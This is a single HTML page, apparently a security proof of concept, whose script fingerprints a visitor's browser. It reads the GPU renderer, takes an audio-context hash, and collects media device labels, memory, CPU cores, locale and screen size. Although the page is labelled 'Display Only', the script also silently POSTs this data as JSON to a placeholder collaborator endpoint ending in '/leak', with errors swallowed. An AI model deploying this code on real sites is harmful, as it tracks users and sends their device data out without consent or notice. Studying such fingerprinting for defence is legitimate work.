<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>🔎 Fingerprint PoC (Display Only)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; margin: 2rem; }
    .row { display:flex; gap:.5rem; flex-wrap:wrap; margin-bottom:1rem }
    button { padding:.6rem .9rem; border-radius:.5rem; border:1px solid #ccc; cursor:pointer }
    pre { white-space:pre-wrap; border:1px solid #ddd; padding:1rem; border-radius:.5rem; max-width:100%; overflow:auto }
    .muted { color:#666; font-size:.9rem }
  </style>
</head>
<body>
  <h2>📤 WebAssembly-style Fingerprint PoC (Display, no download)</h2>
  <div class="row">
    <button id="collect">Collect & Send</button>
    <button id="copy" disabled>Copy</button>
  </div>
  <div class="muted">Note: Some signals require a user gesture and HTTPS (e.g., audio, media device labels).</div>
  <pre id="out">Ready.</pre>

<script>
  // 🔧 Set your endpoint here
  const burpURL = "https://your-collaborator-or-server/leak";

  async function getGPUInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "WebGL not supported";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return debugInfo
        ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        : "GPU info not available";
    } catch (e) {
      return `GPU error: ${e && e.message ? e.message : e}`;
    }
  }

  async function getAudioFingerprint() {
    try {
      const Ctx = window.AudioContext || window.webkitAudioContext;
      if (!Ctx) return "AudioContext not supported";
      const ctx = new Ctx();
      // Ensure resumed on user gesture (button click)
      if (ctx.state === "suspended") { await ctx.resume(); }

      const oscillator = ctx.createOscillator();
      const analyser = ctx.createAnalyser();
      const gain = ctx.createGain();
      const script = ctx.createScriptProcessor(4096, 1, 1);

      return await new Promise(resolve => {
        oscillator.type = 'triangle';
        oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
        gain.gain.setValueAtTime(0, ctx.currentTime);
        oscillator.connect(analyser);
        analyser.connect(script);
        script.connect(ctx.destination);
        oscillator.start(0);

        script.onaudioprocess = function (event) {
          const data = event.inputBuffer.getChannelData(0);
          let hash = 0;
          for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
          // Cleanup
          try { script.disconnect(); analyser.disconnect(); oscillator.stop(); ctx.close(); } catch {}
          resolve("Audio Hash: " + Math.floor(hash).toString(16));
        };
      });
    } catch (e) {
      return `Audio error: ${e && e.message ? e.message : e}`;
    }
  }

  async function getMediaDevices() {
    try {
      // enumerateDevices labels require a granted permission in most browsers
      const devices = await navigator.mediaDevices?.enumerateDevices?.();
      if (!devices) return "";
      const labeled = devices.filter(d => d.label && d.label !== "" && d.label !== "[unknown]");
      if (!labeled.length) return "";
      return labeled.map(d => `${d.kind}: ${d.label}`).join("\n");
    } catch {
      return "";
    }
  }

  function buildPayload({gpu, audio, mediaDevices}) {
    const info = {
      userAgent: navigator.userAgent,
      ramGB: navigator.deviceMemory ?? null,
      cpuCores: navigator.hardwareConcurrency ?? null,
      platform: navigator.platform,
      languages: navigator.languages || [],
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      gpuRenderer: gpu,
      audioFingerprint: audio,
      doNotTrack: navigator.doNotTrack,
      connection: (navigator.connection && navigator.connection.effectiveType) || "Unknown",
      mediaDevices: mediaDevices || null,
      timestamp: new Date().toISOString()
    };

    // Pretty text block for on-page display
    const pretty = [
      "== Sensitive Fingerprint (Display Only) ==",
      `User-Agent: ${info.userAgent}`,
      `RAM: ${info.ramGB ?? "?"} GB`,
      `CPU Cores: ${info.cpuCores ?? "?"}`,
      `Platform: ${info.platform}`,
      `Languages: ${info.languages.join(", ")}`,
      `Locale: ${info.locale}`,
      `Timezone: ${info.timeZone}`,
      `Screen: ${info.screen}`,
      `DPR: ${info.devicePixelRatio}`,
      `GPU Renderer: ${info.gpuRenderer}`,
      `Audio Fingerprint: ${info.audioFingerprint}`,
      `DoNotTrack: ${info.doNotTrack}`,
      `Connection Type: ${info.connection}`,
      info.mediaDevices ? `Media Devices:\n${info.mediaDevices}` : null,
      `Timestamp: ${info.timestamp}`
    ].filter(Boolean).join("\n");

    return { json: info, text: pretty };
  }

  async function collectAndSend() {
    const out = document.getElementById("out");
    const copyBtn = document.getElementById("copy");
    out.textContent = "Collecting…";

    const [gpu, audio, mediaDevices] = await Promise.all([
      getGPUInfo(),
      getAudioFingerprint(),
      getMediaDevices()
    ]);

    const payload = buildPayload({ gpu, audio, mediaDevices });

    // 1) Display on page (no download)
    out.textContent = payload.text;
    copyBtn.disabled = false;

    // 2) Send to server as text AND JSON (choose one on server side)
    // Note: mode:no-cors suppresses response details; remove it if you control CORS.
    try {
      await fetch(burpURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload.json),
        mode: "no-cors",
        keepalive: true
      });
    } catch (e) {
      // Swallow errors in PoC context
      console.warn("POST failed:", e);
    }
  }

  document.getElementById("collect").addEventListener("click", collectAndSend);
  document.getElementById("copy").addEventListener("click", async () => {
    const out = document.getElementById("out").textContent;
    try {
      await navigator.clipboard.writeText(out);
      alert("Copied to clipboard.");
    } catch {
      // Fallback
      const ta = document.createElement("textarea");
      ta.value = out; document.body.appendChild(ta); ta.select();
      document.execCommand("copy"); ta.remove();
      alert("Copied.");
    }
  });
</script>
</body>
</html>
